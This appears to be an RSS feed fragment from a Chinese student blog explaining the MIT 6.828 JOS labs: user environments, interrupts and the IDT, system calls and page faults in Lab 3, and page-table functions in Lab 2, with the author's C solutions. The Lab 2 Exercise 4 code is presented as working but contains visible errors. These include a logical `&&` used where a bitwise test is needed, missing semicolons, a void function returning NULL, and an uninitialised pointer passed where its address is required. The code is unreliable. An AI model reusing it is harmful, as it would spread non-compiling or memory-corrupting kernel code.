id="Creating-and-Running-Environments"><a href="#Creating-and-Running-Environments" class="headerlink" title="Creating and Running Environments"></a>Creating and Running Environments</h3><p>现在需要去编写kern/env.c文件来运行一个用户环境了。由于现在没有文件系统，所以我们设置内核来加载嵌入在内核中的静态二进制文件映像。</p><p>Lab3里面的GNUmakefile文件在obj/user/目录下面生成了一系列的二进制映像文件。如果你看一下kern/Makefrag文件，就会发现一些奇妙的地方，这些地方把二进制文件直接链接到内核可执行文件中，只要这些文件是.o文件。其中在链接器命令行中的-b binary 选项会使这些文件被当做二进制执行文件链接到内核之后。在 i386_init() 函数中，你会看到运行上述二进制文件的代码，但是我们需要完成能够设置这些代码的运行用户环境的功能。</p><p>用户环境的代码被调用前，操作系统一共俺顺序执行了以下函数：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start (kern/entry.S)</span><br><span class="line">i386_init (kern/init.c)</span><br><span class="line">cons_init</span><br><span class="line">mem_init</span><br><span class="line">env_init</span><br><span class="line">trap_init (still incomplete at this point)</span><br><span class="line">env_create</span><br><span class="line">env_run</span><br><span class="line">env_pop_tf</span><br></pre></td></tr></table></figure><p>一旦完成上述函数的代码，并且在QEMU下编译运行，系统会进去用户空间，并且开始执行hello程序，知道他做出一个系统调用指令int。但是这个系统调用指令不能成功运行，因为到目前为止，JOS还没设置相关硬件来实现从用户态到内核态的转换功能。当CPU发现，它没有被设置能够处理这种系统调用的中断时，它会触发一个保护异常，然后发现这个保护异常，然后发现这个保护异常也无法处理，从而又产生一个错误异常，然后又发现仍旧无法解决问题，所以最后放弃，我们把这个叫做”triple fault”。通常来说，接下来CPU会复位，系统会重启。</p><p>所以我们马上要来解决这个问题，不过解决之前我们可以使用调试器来检查一下程序要进入用户模式时做了什么。使用make qemu-gdb 并且在 env_pop_tf 处设置断点，这条指令应该是即将进入用户模式之前的最后一条指令。然后进行单步调试，处理会在执行完 iret 指令后进入用户模式。然后依旧可以看到进入用户态后执行的第一条指令了，该指令是一个cmp指令，开始于文件 lib/entry.S 中。 现在使用 b *0x… 设置一个断点在hello文件（obj/user/hello.asm）中的sys_cputs函数中的 int $0x30 指令处。这个int指令是一个系统调用，用来展示一个字符到控制台。如果你的程序运行不到这个int指令，说明有错误。至于在什么时候运行这个程序的，我们可以看到在i386_init中trap_init执行完后，ENV_CREATE(user_hello, ENV_TYPE_USER)，这个就会加载我们的ELF程序，然后就会执行我们的env_run。</p><h3 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h3><p>到目前为止，当程序运行到第一个系统调用int 0x30时，会进入错误的状态，因为现在系统调用无法从用户态切换到内核态。所以需要实现一个基本的异常/系统调用处理机制，使得内核可以从用户态转换为内核态。我们要先熟悉下x86的异常中断机制。</p><h3 id="Basics-of-Protected-Control-Transfer"><a href="#Basics-of-Protected-Control-Transfer" class="headerlink" title="Basics of Protected Control Transfer"></a>Basics of Protected Control Transfer</h3><p>异常和中断都是”受到保护的控制转移方法”，都会使处理器从用户态转移为内核态。在Intel的术语中，一个中断指的是由外部异步事件引起的处理器控制器转移，比如外部I/O设备发送来的中断信号。一个异常指的是由于当前正在运行的指令所带来的同步处理器控制权的转移，比如除零溢出异常。</p><p>为了能够确保这些控制的转移能够真正被保护起来，处理器的中断/异常机制通常被设计为：用户态的代码无权选择内核中的代码从哪里开始执行。处理器可以确保只有在某些条件下，才能进入内核态。在X86上，有两种机制配合工作来提供这种保护：</p><ol><li><p>中断向量表：</p><p>处理器保证中断和异常只能够引起内核进入到一些特定的，被事现定义好的程序入口点，而不是由触发中断的程序来觉得中断程序入口点</p><p>x86允许多达256个不同的中断和异常，每一个都配备一个独一无二的中断向量。一个向量指的就是0到255中的一个数。一个中断向量的值是根据中断源来决定的：不同设备，错误条件，以及对内核的请求都会产生不同的中断和中断向量的组合。CPU将使用这个向量作为这个中断在中断向量表中的索引，这个表是由内核设置的，放在内核空间中，和GDT很像。通过这个表中的任意一个表项，处理器可以知道：</p><ul><li>需要加载到EIP寄存器中的值，这个值指向了处理这个中断的中断处理程序的位置。</li><li>需要加载到CS寄存器中的值，里面还包含了这个中断处理程序的运行特权级(即这个程序是在用户态还是内核态运行)。</li></ul></li><li><p>任务状态段：</p><p>处理器还需要一个地方来存放，当异常/中断发生时，处理器的状态，比如EIP和CS寄存器的值。这样的话，中断处理程序一会可以重新返回到原来的程序中。这段内存自然也要保护起来，不能被用户态的程序所篡改。</p><p>正因为如此，当一个x86处理器要处理一个中断、异常并且使运行特权级从用户态转为内核态时，它也会把它的堆栈切换到内核空间中。一个叫做”任务状态段”的数据结构将会详细记录这个堆栈所在的段的断描述符和地址。处理器会把SS，ESP，EFLAGS，CS，EIP以及一个可选错误码等等这些值压入到这个堆栈上。然后加载中断处理程序的CS，EIP值，并且设置ESP，SS寄存器指向新的堆栈。</p><p>尽管TSS非常大，并且还有很多其他的功能，但是JOS仅仅使用它来定义处理器从用户态转向内核态所采用的内核堆栈，由于JOS中的内核指的就是特权级0，所以处理器用TSS中的ESP0，SS0字段来指明这个内核堆栈的位置，大小。</p></li></ol><h3 id="Types-of-Exceptions-and-Interrupts"><a href="#Types-of-Exceptions-and-Interrupts" class="headerlink" title="Types of Exceptions and Interrupts"></a>Types of Exceptions and Interrupts</h3><p>所有的由x86处理器内部产生的异常的向量值都是0到31之间的整数，因此映射到IDT条目0到31。例如，页错误所对应的向量值是14，而大于31号的中断向量对应的是软件中断，由int指令生成；或者由外部中断，由外部设备生成。</p><p>在这一章我们将拓展JOS的功能，使它能够处理0到31号内部异常。在下一章能够处理48号中断(0x30)中断，主要用来被用于系统调用。在Lab4中会继续扩展JOS使它能够处理外部硬件中断，比如时钟中断。</p><h3 id="An-Example"><a href="#An-Example" class="headerlink" title="An Example"></a>An Example</h3><p>让我们看一个例子，假设处理器正在用户状态下运行代码，但是遇到一个除法指令，并且除数为0。</p><ol><li><p>处理器会首先切换自己的堆栈，切换到TSS的SS0，ESP0字段所指定的内核堆栈区，这两个字段分别存放着GK_KD和KSTACKTOP的值。</p></li><li><p>处理器把异常参数压入到内核堆栈中，起始于地址KSTACKTOP：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13850890084/0" alt="image-20210805174531695"></p></li><li><p>因为我们要处理的是除零异常，它的中断向量是0，处理器会读取IDT表中的0号表项，并且把CS:EIP的值设置为0号中断处理函数的地址</p></li><li><p>中断处理函数开始执行，并且处理中断。</p><p>对于某些特定的异常，除了上面图中要保存的值之外，还要再压入一个值，叫做错误码。比如页表错误，就是其中一个实例。当压入错误码之后，内核的堆栈如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13850890540/0" alt="image-20210805174537673"></p></li></ol><p>以上几步都是硬件自动完成的。</p><h3 id="Nested-Exceptions-and-Interrupts"><a href="#Nested-Exceptions-and-Interrupts" class="headerlink" title="Nested Exceptions and Interrupts"></a>Nested Exceptions and Interrupts</h3><p>处理器在用户态和内核态下都可以处理异常或中断。只有当处理器从用户态切换到内核态时，才会自动地切换堆栈，并且把一些寄存器中的原来的值压入到堆栈上，并且触发相应的中断处理函数。但如果处理器已经由于正在处理中断而处于内核态下，此时CPU只会向堆栈压入更多的值。通过这种方式，内核就可以处理嵌套中断。</p><p>如果处理器已经在内核态下并且遇到嵌套中断，因为它不需要切换堆栈，所以它不需要存储SS，ESP寄存器的值。此时内核堆栈就像下面这个样子：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13850915540/0" alt="image-20210805175120776"></p><p>这里有一个重要的警告。如果处理器在内核态下接受一个异常，而且由于一些原因，比如堆栈空间不足，不能把当前的状态信息(寄存器的值)压入到内核堆栈中时，那么处理器是无法恢复到原来的状态了，它会自动重启。</p><h3 id="Setting-Up-the-IDT"><a href="#Setting-Up-the-IDT" class="headerlink" title="Setting Up the IDT"></a>Setting Up the IDT</h3><p>现在已经有了所有的基本信息去设置IDT表，并且在JOS处理异常。现在只需要处理内部异常(中断向量号0到31)。</p><p>在头文件inc/trap.h和kern/trap.h中包含了和中断异常相关的非常重要的定义。kern/trap.h文件中包含了仅内核可见的一些定义，inc/trap.h中包含了用户态也可见的一些定义。</p><p>最后我们要实现的代码的效果如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13851554882/0" alt="image-20210805205605979"></p><p>每一个中断或异常都有它自己的中断处理函数，分别定义在trapentry.S中，trap_init函数将初始化IDT表。每一个处理函数都应该构建一个结构体Trapframe在堆栈上，并且调用trap函数指向这个结构体，trap函数然后处理异常/中断，给它分配一个中断处理函数。</p><p>所以整个操作系统的中断控制流程为：</p><ol><li>trap_init()先将所有中断处理函数的起始地址放到中断向量表IDT中。</li><li>当中断发生时，不管是外部中断还是内部中断，处理器捕捉到该中断，进入内核态，根据中断向量去查询中断向量表，找到对应的表项。</li><li>保存被中断的程序的上下文到内核堆栈中，调用这个表项中指明的中断处理函数。</li><li>执行中断处理函数。</li><li>执行完成后，恢复被中断的进程的上下文，返回用户态，继续运行这个进程。</li></ol><p>缺页中断是一个非常重要的中断，因为我们在后续的实验中，非常依赖于能够处理缺页中断的能力。当缺页中断发生时，系统会把引起中断的线性地址存放到控制寄存器 CR2 中。在trap.c 中，已经提供了一个能够处理这种缺页异常的函数page_fault_handler()。</p><h3 id="The-Breakpoint-Exception"><a href="#The-Breakpoint-Exception" class="headerlink" title="The Breakpoint Exception"></a>The Breakpoint Exception</h3><p>断点异常，异常号为3，这个异常可以让调试器能够给程序加上断点。加断点的基本原理就是把要加断点的语句用一个 INT3 指令替换，执行到INT3时，会触发软中断。在JOS中，我们将通过把这个异常转换成一个伪系统调用，这样的话任何用户环境都可以使用这个伪系统调用来触发JOS kernel monitor。</p><h3 id="System-calls"><a href="#System-calls" class="headerlink" title="System calls"></a>System calls</h3><p>用户程序会要求内核帮助它完成系统调用。当用户程序触发系统调用，系统进入内核态。处理器和操作系统将保存该用户程序当前的上下文状态，然后由内核将执行正确的代码完成系统调用，然后回到用户程序继续执行。而用户程序到底是如何得到操作系统的注意，以及它如何说明它希望操作系统做什么事情的方法是有很多不同的实现方式的。</p><p>在JOS中，我们会采用int指令，这个指令会触发一个处理器的中断。特别的，我们用int $0x30来代表系统调用中断。注意，中断0x30不是通过硬件产生的。</p><p>应用程序会把系统调用号以及系统调用的参数放到寄存器中。通过这种方法，内核就不需要去查询用户程序的堆栈了。系统调用号存放到 %eax 中，参数则存放在 %edx, %ecx, %ebx, %edi, 和 %esi 中。内核会把返回值送到 %eax中。在lib/syscall.c中已经写好了触发一个系统调用的代码。</p><h3 id="User-mode-startup"><a href="#User-mode-startup" class="headerlink" title="User-mode startup"></a>User-mode startup</h3><p>用户程序真正开始运行的地方是在lib/entry.S文件中。该文件中，首先会进行一些设置，然后就会调用lib/libmain.c 文件中的 libmain() 函数。你首先要修改一下 libmain() 函数，使它能够初始化全局指针 thisenv ，让它指向当前用户环境的 Env 结构体。然后 libmain() 函数就会调用 umain，这个 umain 程序恰好是 user/hello.c 中被调用的函数。在之前的实验中我们发现，hello.c程序只会打印 “hello, world” 这句话，然后就会报出 page fault 异常，原因就是 thisenv-&gt;env_id 这条语句。现在你已经正确初始化了这个 thisenv的值，再次运行就应该不会报错了</p><p>这里经过调试，在下面这个图的指令上就会触发page fault异常，因为我们的eax为0，就是thisenv还未初始化，所以此时就会触发异常</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855120758/0" alt="image-20210806215640906"></p><p>然后就会进入到下面，接着调用page fault处理函数</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855126242/0" alt="image-20210806215844590"></p><p>由于exeircise8较少，我们就写在这里，其实就是初始化thisenv指针。</p><p>通过env.h中的注释，我们知道只要知道env_id的0到9，就能知道这个环境在envs数组中的索引，就能得到Env结构体了。</p><p>所以我们修改我们lib/libmain.c下的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">libmain(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// set thisenv to point at our Env structure in envs[].</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">envid_t</span> envid = sys_getenvid();</span><br><span class="line">thisenv = envs + envid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// save the name of the program so that panic() can use it</span></span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">0</span>)</span><br><span class="line">binaryname = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// call user main routine</span></span><br><span class="line">umain(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exit gracefully</span></span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一切顺利就会打印处下面的两句</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855169365/0" alt="image-20210806221455126"></p><h3 id="Page-faults-and-memory-protection"><a href="#Page-faults-and-memory-protection" class="headerlink" title="Page faults and memory protection"></a>Page faults and memory protection</h3><p>内存保护是操作系统的非常重要的一项功能，它可以防止由于用户程序崩溃对操作系统带来的破坏与影响。</p><p>操作系统通常依赖于硬件的支持实现内存保护。操作系统可以让硬件能够始终知晓哪些虚拟地址是有效的，哪些是无效的。当程序尝试访问一个无效地址，或者尝试去访问一个超出它访问权限的地址时，处理器会在这个指令处终止，并且触发异常，陷入内核态，与此同时把错误的信息报告给内核。如果这个错误是可以被修复的，那么内核会修复这个异常，然后程序继续运行。如果异常无法修复，则程序永远不会继续运行。</p><p>作为一个可修复的例子，让我们考虑一下可自动拓展的堆栈。在许多系统中，内核在初始化情况下只会分配一个内核堆栈页，如果程序想要访问这个内核堆栈页之外的堆栈空间的话，就会触发异常，此时内核会自动再分配一些页给这个程序，程序就可以继续运行了。</p><p>系统调用也为内存保护带来了问题。大部分系统调用接口让用户程序传递一个指针参数给内核。这些指针指向的是用户缓冲区。通过这种方式，系统调用在执行时就可以解引用这些指针。但是这里有两个问题：</p><ol><li><p>在内核中的page fault要比在用户程序中的page fault更严重。如果内核在操作自己的数据结构时出现 page faults，这是一个内核的bug，而且异常处理程序会中断整个内核。但是当内核在解引用由用户程序传递来的指针时，它需要一种方法去记录此时出现的任何page faults都是由用户程序带来的。</p></li><li><p>内核通常比用户程序有着更高的内存访问权限。用户程序很有可能要传递一个指针给系统调用，这个指针指向的内存区域是内核可以进行读写的，但是用户程序不能。此时内核必须小心不要去解析这个指针，否则的话内核的重要信息很有可能被泄露。</p><p>现在我们需要通过仔细检查所有由用户传递来指针所指向的空间来解决上述两个问题。当一个程序传递给内核一个指针时，内核会检查这个地址是在整个地址空间的用户地址空间部分，而且页表也运行进行内存的操作。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本实验大致做了三件事：</p><ol><li><p>进程建立，可以加载用户ELF文件并执行：</p><ol><li><p>内核维护一个名为envs的Env数组，每个Env结构对应一个进程，Env结构最重要的字段有Trapframe env_tf（该字段中断发生时可以保存寄存器的状态），pde_t *env_pgdir（该进程的页目录地址）。进程对应的内核数据结构可以用下图总结：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_3_%E6%80%BB%E7%BB%93_%E8%BF%9B%E7%A8%8B%E6%8A%BD%E8%B1%A1.png" alt="JOS进程数据结构"></p></li><li><p>定义了env_init函数，env_create等函数，初始化Env结构，将Env结构Trapframe env_tf中的寄存器值设置到寄存器中，从而达到执行该Env的效果</p></li></ol></li><li><p>创建异常处理函数，建立并加载IDT，使JOS能支持中断处理。要能说出中断发生时的详细步骤。需要搞清楚内核态和用户态转换方式：通过中断机制可以从用户环境进入内核态。使用iret指令从内核态回到用户环境。中断发生过程以及中断返回过程和系统调用原理可以总结为下图：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab3/lab3_4_%E6%80%BB%E7%BB%93_%E4%B8%AD%E6%96%AD%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8.png" alt="JOS中断过程，系统调用原理"></p></li><li><p>利用中断机制，使JOS支持系统调用。遇到int 0x30这条系统调用指令时发生的详细步骤参考上图。</p></li></ol><p>lab3完~</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13855481716/0" alt="image-20210807005029900"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/03/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab2-Exercise5</title>
      <link>https://billyotry.github.io/2021/08/02/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise5/</link>
      <guid>https://billyotry.github.io/2021/08/02/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise5/</guid>
      <pubDate>Mon, 02 Aug 2021 13:14:38 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;继续完善mem_init()函数，你的程序现在必须能够通过check_kern_pgdir()和check_page_installed_p
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>继续完善mem_init()函数，你的程序现在必须能够通过check_kern_pgdir()和check_page_installed_pgdir()函数的检测。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>剩下的工作就是完善mem_init函数，现在要完善的功能就是把关于操作系统的一些重要的地址映射到现在的新的页目录项上。可以利用之前的boot_map_region函数。</p><p>首先我们要映射的范围是把pages数组映射到线性地址UPAGES，大小为一个PTSIZE。</p><p>所以我们添加的代码为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, UPAGES, PTSIZE, PADDR(pages), PTE_U);</span><br></pre></td></tr></table></figure><p>其中perm变量之所以设置为PTE_U，是因为这部分空间是kernel space和user space中的代码都能访问的，所以要设置PTE_U。</p><p>然后映射内核的堆栈区域，把由bootstack变量所标记的物理地址范围映射给内核的堆栈。内核堆栈的虚拟地址范围是[KSTACKTOP-PTSIZE, KSTACKTOP)，不过要把这个范围划分成两部分：</p><ul><li>[KSTACKTOP-KSTKSIZE, KSTACKTOP) 这部分映射关系加入的页表中。</li><li>[KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) 这部分不进行映射。</li></ul><p>对这部分地址的访问权限是，kernel space 可以读写，user space 无权访问，所以代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir,KSTACKTOP-KSTKSIZE,KSTKSIZE,PADDR(bootstack),PTE_W);</span><br></pre></td></tr></table></figure><p>最后映射整个操作系统内核，虚拟地址范围是[KERNBASE, 2^32]，物理地址范围是[0，2^32 - KERNBASE]。</p><p>访问权限是，kernel space 可以读写，user space 无权访问，所以代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boot_map_region(kern_pgdir, KERNBASE, <span class="number">0xffffffff</span> - KERNBASE, <span class="number">0</span>, PTE_W);</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/02/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab2-Exercise4</title>
      <link>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise4/</link>
      <guid>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise4/</guid>
      <pubDate>Sun, 01 Aug 2021 08:59:45 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;在kern/pmap.c中必须实现pgdir_walk()  boot_map_region()  page_lookup()  page_
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>在kern/pmap.c中必须实现pgdir_walk()  boot_map_region()  page_lookup()  page_remove()  page_insert()函数。</p><p>mem_init中的check_page函数会检查我们的页表管理程序。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>pgdir_walk其实在注释中就说的很清楚了,通过线性地址va来返回对应页表项的地址，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pte_t</span> *</span><br><span class="line">pgdir_walk(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">int</span> create)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">uint32_t</span> pdx = PDX(va);<span class="comment">//(va&gt;&gt;22)&amp;&amp;0x3ff高10位页目录项索引</span></span><br><span class="line"><span class="keyword">uint32_t</span> ptx = PTX(va);<span class="comment">//(va&gt;&gt;12)&amp;&amp;0x3ff中间10位页表项索引</span></span><br><span class="line"><span class="keyword">pte_t</span> *pde;<span class="comment">//页目录项指针</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte;<span class="comment">//页表项指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"></span><br><span class="line">pde = &amp;pgdir[pdx] <span class="comment">//页目录项的地址</span></span><br><span class="line"><span class="keyword">if</span>(*pde &amp;&amp; PTE_P)&#123; </span><br><span class="line"><span class="comment">//二级页表存在</span></span><br><span class="line"><span class="comment">//PTE_ADDR得到物理地址，然后转化位虚拟地址，得到页表的虚拟地址</span></span><br><span class="line">pte = (KADDR(PTE_ADDR(*pde)))</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!create)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">pp = page_alloc(ALLOC_ZERO);</span><br><span class="line"><span class="keyword">if</span>(!pp)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">pte = (<span class="keyword">pte_t</span>*)page2kva(pp);</span><br><span class="line">pp-&gt;pp_ref ++;</span><br><span class="line"><span class="comment">//设置页目录项</span></span><br><span class="line">*pde = PADDR(pte) | (PTE_P | PTE_W | PTE_U);<span class="comment">//present writeable user</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;pte[ptx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是boot_map_region函数，把虚拟地址空间范围[va, va+size)映射到物理空间[pa, pa+size)的映射关系加入到页表pgdir中。这个函数主要的目的是为了设置虚拟地址UTOP之上的地址范围，这一部分的地址映射是静态的，在操作系统的运行过程中不会改变，所以这个页的PageInfo结构体中的pp_ref域的值不会发生改变。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">boot_map_region(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> va, <span class="keyword">size_t</span> size, <span class="keyword">physaddr_t</span> pa, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">//计算总共有多少页</span></span><br><span class="line"><span class="keyword">size_t</span> pgs = size / PGSIZE;</span><br><span class="line"><span class="keyword">if</span>(size % PGSIZE != <span class="number">0</span>)&#123; <span class="comment">//这里要注意页对齐，如果多出来几个字节，需多分配一个页</span></span><br><span class="line">pgs++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; pgs;i++)&#123;</span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,(<span class="keyword">void</span>*)va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(pte == <span class="literal">NULL</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;boot_map_region(): out of memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">*pte = pa | perm | PTE_P;</span><br><span class="line">va += PGSIZE;</span><br><span class="line">pa += PGSIZE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是page_insert函数，把一个物理内存中页pp与虚拟地址va建立映射关系。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">page_insert(<span class="keyword">pde_t</span> *pgdir, struct PageInfo *pp, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!pte)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br><span class="line">pp-&gt;pp_ref ++;</span><br><span class="line"><span class="comment">//if is already mapped</span></span><br><span class="line"><span class="keyword">if</span>(*pte &amp; PTE_P)&#123;</span><br><span class="line">page_remove(pgdir,va);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pte = page2pa(pp) | perm | PTE_P;</span><br><span class="line"><span class="comment">//pp-&gt;pp_ref ++;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里提一点这个pp_ref++的位置，因为如果是先执行page_remove的话，如果将ref刚好置零那么此时就会释放了这个page，所以要在page_remove之前先将ref加一。</p><p>接着就是page_lookup函数，返回虚拟地址va所映射的物理页的pageinfo</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class"><span class="title">page_lookup</span>(<span class="title">pde_t</span> *<span class="title">pgdir</span>, <span class="title">void</span> *<span class="title">va</span>, <span class="title">pte_t</span> **<span class="title">pte_store</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span>;</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte = pgdir_walk(pgdir,va,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!pte)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pte_store)&#123;</span><br><span class="line">*pte_store = pte;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(*pte &amp; PTE_P))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">pp = pa2page(PTE_ADDR(*pte));</span><br><span class="line"><span class="keyword">return</span> pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是page_remove函数了，就是把虚拟地址va和物理页的映射关系删除</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_remove(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">void</span> *va)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> * <span class="title">pp</span> =</span> page_lookup(pgdir,va,pte);</span><br><span class="line"><span class="keyword">if</span>(!pp)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_decref(pp);<span class="comment">//ref值减一</span></span><br><span class="line">tlb_invalidate(pgdir,va);</span><br><span class="line">*pte = <span class="number">0</span>;<span class="comment">//页表项内容置零</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab2-Exercise3</title>
      <link>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise3/</link>
      <guid>https://billyotry.github.io/2021/08/01/%E3%80%90MIT6.828%E3%80%91Lab2-Exercise3/</guid>
      <pubDate>Sun, 01 Aug 2021 02:59:17 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;任务&quot;&gt;&lt;a href=&quot;#任务&quot; class=&quot;headerlink&quot; title=&quot;任务&quot;&gt;&lt;/a&gt;任务&lt;/h3&gt;&lt;p&gt;通过GDB我们只能通过虚拟地址来查看内存所存放的内容，但是如果能访问到物理内存的话，肯定会更有帮助的。们可以看一下QEMU中的一些常用指令，
        
      
      </description>
      
      
